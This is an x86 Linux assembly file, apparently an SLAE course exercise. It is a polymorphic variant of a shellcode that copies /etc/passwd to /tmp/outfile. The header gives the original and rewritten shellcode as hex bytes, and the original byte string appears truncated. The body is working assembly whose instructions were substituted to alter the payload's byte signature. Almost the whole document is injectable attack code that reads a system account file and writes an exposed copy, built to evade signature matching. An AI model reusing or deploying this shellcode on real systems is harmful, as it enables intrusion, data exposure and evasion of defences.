;Original description:   Copy /etc/passwd to /tmp/outfile (97 bytes)
;Original Shellcode:     \x31\xc0\xb0\x05\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x8d\x5c\x24\x01\xcd\x80\x89\xc3\xb0\x03\x89\xe7\x89\xf9\x66\x6a\xff\x5a\xcd\x80\x89\xc6\x6a\x05\x58\x31\xc9\x51\x68\x66\x69\x6c\x65\x68\x2f\x6f\x75\x74\x68\x2f\x74\x6d\x70\x89\xe3\xb1\x42\x66\x68\xa4\x01\x5a\xcd\x80\x89\xc3\x6a\x04\x58\x89\xf9\x89\xf2\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xb3\x05\xcd\x8
;Original author:        Paolo Stivanin <https://github.com/polslinux>
;
; ==================================================================================
;
; Description: Copy /etc/passwd to /tmp/outfile (93 bytes)
; Shellcode: \x31\xc0\x04\x05\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe3\xcd\x80\x93\x91\x89\xe7\xb0\x03\x99\x66\xba\xff\xff\xcd\x80\x89\xc6\x6a\x05\x58\x31\xc9\x51\x68\x66\x69\x6c\x65\x68\x2f\x6f\x75\x74\x68\x2f\x74\x6d\x70\x8d\x1c\x24\xb1\x42\x99\x66\xba\xa4\x01\xcd\x80\x89\xc3\x89\xf9\x89\xf2\xcd\x80\x93\x83\xe8\x03\x89\xc3\x83\xc3\x05\xcd\x80
; Author: thryb <https://www.github.com/thryb/SLAE-770>
; SLAE ID: SLAE-770
:



global _start
section .text
_start:
    xor eax,eax
    ;mov al,0x5
    ; replaced with
    ; --- start ---
    add al, 0x5
    ; --- end ---
    xor ecx,ecx
    push ecx
    push 0x64777373 
    push 0x61702f63
    push 0x74652f2f
    ; lea ebx,[esp +1]
    ; replaced with
    ; --- start --- 
    mov ebx, esp
    ; --- end --- 

    int 0x80


    ;mov ebx,eax
    ;mov al,0x3
    ;mov edi,esp
    ;mov ecx,edi
    ;mov ecx, esp
    ;xor edx, edx
    ;mov dx, 0xFFF
    ;inc edx
    ;int 0x80
    ; instructions replaced with 
    ; --- start ---
    xchg eax, ebx
    xchg eax, ecx
    mov edi, esp
    mov al, 0x3
    cdq
    mov dx, 0xFFFF
    int 0x80
    ; --- end ---
    
    mov esi,eax

    push 0x5
    pop eax
    xor ecx,ecx
    push ecx
    push 0x656c6966
    push 0x74756f2f
    push 0x706d742f
    
    ; mov ebx,esp
    ; instruction replaced with
    ; --- start ---
    lea ebx, [esp]
    ; --- end ---

    mov cl,0102o

    ; push WORD 0644o
    ; pop edx
    ; instructions replaced with
    ; --- start ---
    cdq
    mov dx, 0644o
    ; --- end ---
    int 0x80

    mov ebx,eax
    ; no need, 0x4 already in eax
    ; push 0x4
    ; pop eax
    mov ecx,edi
    mov edx,esi
    int 0x80

    ;xor eax,eax
    ;xor ebx,ebx
    ;mov al,0x1
    ;mov bl,0x5
    ; instructions replaced with
    ; --- start ---
    xchg eax, ebx
    sub eax, 3
    mov ebx, eax
    add ebx, 5
    ; --- end ---

    int 0x80





